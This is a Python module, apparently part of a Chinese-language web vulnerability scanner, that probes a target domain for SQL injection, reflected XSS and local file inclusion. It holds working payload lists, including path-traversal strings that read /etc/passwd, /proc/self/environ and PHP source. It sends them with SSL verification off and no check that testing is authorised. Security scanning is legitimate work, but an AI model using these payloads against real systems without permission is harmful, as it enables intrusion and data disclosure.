#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
injection.py - SQL注入 / XSS / LFI 综合快速检测工具 v1.0
独立实现，不依赖外部工具，对目标进行快速注入漏洞筛查
"""

import os
import sys
import json
import datetime
import requests
import re
from typing import List, Dict

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from tools import RESULTS_BASE
from utils import Colors

TOOL_NAME = "Web注入检测 (SQL/XSS/LFI)"
TOOL_ID = "injection"
TOOL_DESC = "SQL注入 + XSS + LFI 综合快速检测，支持错误型/盲注/反射型XSS/本地文件包含"
TOOL_CATEGORY = "vuln"
TOOL_PRIORITY = 2

TIMEOUT = 5
VERIFY_SSL = False

SQLI_PAYLOADS = [
    ("错误型", "' OR '1'='1", "SQL syntax|mysql_fetch|ODBC Driver|PostgreSQL|Warning:"),
    ("联合查询", "' UNION SELECT NULL--", "UNION"),
    ("布尔盲注", "' AND 1=1-- ", ""),
    ("时间盲注", "'; WAITFOR DELAY '00:00:03'--", ""),
    ("注释绕过", "' OR 1=1#", "error|warning|syntax"),
    ("双写绕过", "' OORR 1=1--", "error|warning"),
    ("宽字节", "%df' OR 1=1-- ", "error|warning"),
]

XSS_PAYLOADS = [
    ("基础弹窗", '<script>alert("XSS")</script>', r"<script>alert\(\"XSS\"\)</script>"),
    ("IMG事件", '<img src=x onerror=alert(1)>', r"onerror=alert\(1\)"),
    ("SVG向量", '<svg onload=alert(1)>', r"onload=alert\(1\)"),
    ("HTML注入", '"><h1>XSS</h1>', r'"><h1>XSS</h1>'),
    ("事件属性", '" onfocus=alert(1) autofocus="', r'onfocus=alert\(1\)'),
]

LFI_PAYLOADS = [
    ("/etc/passwd 直接", "../../../../../../etc/passwd", "root:"),
    ("/etc/passwd 编码", "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "root:"),
    ("/etc/hosts", "../../../../../../etc/hosts", "localhost"),
    ("/proc/self/environ", "../../../../../../proc/self/environ", "PATH="),
    ("Windows hosts", "../../../../../../windows/system32/drivers/etc/hosts", "localhost"),
    ("PHP filter", "php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
]


class Logger:
    def info(self, msg): print(f"{Colors.BLUE}[INFO] {msg}{Colors.RESET}")
    def success(self, msg): print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
    def warning(self, msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")
    def error(self, msg): print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
    def exploit(self, msg): print(f"{Colors.MAGENTA}[⚡] {msg}{Colors.RESET}")
    def raw(self, msg): print(msg)

logger = Logger()


def _test_sqli(session, url: str) -> List[dict]:
    findings = []
    has_params = "?" in url

    for name, payload, success_pattern in SQLI_PAYLOADS:
        if has_params:
            test_url = url + payload if "?" in url and "=" in url.split("?")[1] else url + "?id=" + payload
        else:
            test_url = url.rstrip("/") + "/" + payload

        try:
            resp = session.get(test_url, timeout=TIMEOUT, verify=VERIFY_SSL)
            if success_pattern and resp.text:
                if re.search(success_pattern, resp.text, re.I):
                    findings.append({
                        "type": "SQL注入",
                        "severity": "Critical",
                        "payload": name,
                        "url": test_url,
                        "detail": f"响应匹配SQL错误模式: {success_pattern[:50]}",
                    })
                    break
        except Exception:
            pass
    return findings


def _test_xss(session, url: str) -> List[dict]:
    findings = []
    for name, payload, check_pattern in XSS_PAYLOADS:
        try:
            test_url = url + "?q=" + requests.utils.quote(payload)
            resp = session.get(test_url, timeout=TIMEOUT, verify=VERIFY_SSL)
            if check_pattern and resp.text:
                if re.search(check_pattern, resp.text):
                    findings.append({
                        "type": "反射型XSS",
                        "severity": "Medium",
                        "payload": name,
                        "url": test_url,
                        "detail": f"Payload在响应中原样返回: {payload[:50]}",
                    })
                    break
        except Exception:
            pass
    return findings


def _test_lfi(session, url: str) -> List[dict]:
    findings = []
    for name, payload, check_pattern in LFI_PAYLOADS:
        for param in ["file", "page", "include", "path", "document"]:
            test_url = url + f"?{param}={payload}"
            try:
                resp = session.get(test_url, timeout=TIMEOUT, verify=VERIFY_SSL)
                if check_pattern and resp.text:
                    if re.search(check_pattern, resp.text):
                        findings.append({
                            "type": "本地文件包含(LFI)",
                            "severity": "Critical",
                            "payload": name,
                            "url": test_url,
                            "detail": f"成功读取 {name}",
                        })
                        break
            except Exception:
                pass
        if findings:
            break
    return findings


def execute(scan_result, target_info):
    """
    执行SQL注入 + XSS + LFI综合检测
    """
    domain = target_info.get("domain", "unknown")
    protocol = target_info.get("protocol", "https")
    base_url = f"{protocol}://{domain}"
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    errors = []

    logger.info(f"目标: {base_url}")

    test_urls = [base_url]
    for d in scan_result.get("directories", []):
        path = d.get("path", "")
        if any(kw in path.lower() for kw in ["php", "api", "id=", "page=", "search", "query"]):
            test_urls.append(path)
    test_urls = list(set(test_urls))[:5]

    session = requests.Session()
    session.verify = VERIFY_SSL
    findings = []

    for target_url in test_urls:
        logger.info(f"测试: {target_url}")

        sqli_found = _test_sqli(session, target_url)
        if sqli_found:
            findings.extend(sqli_found)

        if "?" in target_url or "search" in target_url.lower():
            xss_found = _test_xss(session, target_url)
            if xss_found:
                findings.extend(xss_found)

        lfi_found = _test_lfi(session, target_url)
        if lfi_found:
            findings.extend(lfi_found)

    for f in findings:
        sev_color = {"Critical": Colors.RED, "High": Colors.RED, "Medium": Colors.YELLOW}
        c = sev_color.get(f.get("severity", ""), "")
        logger.exploit(f"  {c}[{f['severity']}]{Colors.RESET} {f['type']}: {f['detail'][:80]}")

    status = "success" if findings else "partial"
    summary = {
        "total_findings": len(findings),
        "findings": findings,
        "tested_urls": test_urls,
    }

    if not findings:
        errors.append("未发现注入漏洞")

    result = {
        "tool": TOOL_ID,
        "target": domain,
        "time": timestamp,
        "status": status,
        "summary": summary,
        "errors": errors,
        "findings": findings,
    }

    output_dir = os.path.join(RESULTS_BASE, TOOL_ID)
    os.makedirs(output_dir, exist_ok=True)
    ts_file = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = os.path.join(output_dir, f"result_{domain}_{ts_file}.json")
    with open(out_file, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    logger.info(f"结果已保存: {out_file}")

    return result
